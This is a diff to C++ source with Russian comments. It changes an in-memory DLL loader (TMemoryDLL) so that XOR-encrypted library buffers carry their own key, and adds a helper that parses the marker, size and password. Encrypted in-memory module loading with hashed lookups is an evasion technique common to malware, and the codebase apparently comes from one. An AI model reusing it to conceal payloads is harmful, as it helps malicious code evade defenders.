@@ -564,6 +564,43 @@ bool BuildImport(PVOID ImageBase)
 
 
 
+//-------------------------------------------------
+//  Функция возвращает информацию о буфере
+//  загифрованной библиотеки. Используется
+//  информация заголовков
+//
+//-------------------------------------------------
+bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password)
+{
+	Password = NULL;
+	StartBuf = NULL;
+	Size = 0;
+
+	if (!Buf) return false;
+
+	PCHAR Temp = (PCHAR)Buf;
+
+	if (STRA::Hash(Temp, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH)
+	{
+		// ДЛЛ Зашифрована, возвращаем пароль
+        Password = Temp;
+	}
+
+	Temp += ENCRYPTED_DLL_MARKER_SIZE;
+
+	// Получаем размер
+	Size = *(PDWORD)Temp;
+	Temp += sizeof(DWORD);
+
+	StartBuf = Temp;
+
+	return false;
+}
+
+
+
+
+
 
 //*****************************************************************************
 //                            TMemoryDLL
@@ -648,7 +685,7 @@ bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
 //  NewBufAllocated - Установится в истину, если
 //                    для буфера пришлось выделить память
 //---------------------------------------------------------
-bool TMemoryDLL::DecodeDllByPass(const char* Password, const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
+bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
 {
 	DllSize = 0;
 	NewBuf  = NULL;
@@ -674,7 +711,8 @@ bool TMemoryDLL::DecodeDllByPass(const char* Password, const void* DllBuf, DWORD
 
 	// ДЛЛ зашифрована, расшифровываем
 
-    PCHAR Buf = (PCHAR)DllBuf;
+	PCHAR Buf = (PCHAR)DllBuf;
+	PCHAR Password = Buf;
 
 	// Проверяем маркер библиотеки. Наличие маркера в открытом виде
 	// означает, что данные длл находятся в окрытом виде
@@ -694,7 +732,7 @@ bool TMemoryDLL::DecodeDllByPass(const char* Password, const void* DllBuf, DWORD
 		{
 			// Копируем данные
 			m_memcpy(NewBuf, Buf, DllSize);
-			XORCrypt::Crypt((PCHAR)Password, (LPBYTE)NewBuf, DllSize);
+			XORCrypt::Crypt(Password, (LPBYTE)NewBuf, DllSize, *Password);
         }
 	}
 	else
@@ -713,7 +751,5 @@ bool TMemoryDLL::DecodeDllByPass(const char* Password, const void* DllBuf, DWORD
 	return Result;
 }
 
-bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
-{
-	return DecodeDllByPass(GetSessionPassword(), DllBuf, DllSize, NewBuf, NewBufAllocated);
-}
+
+
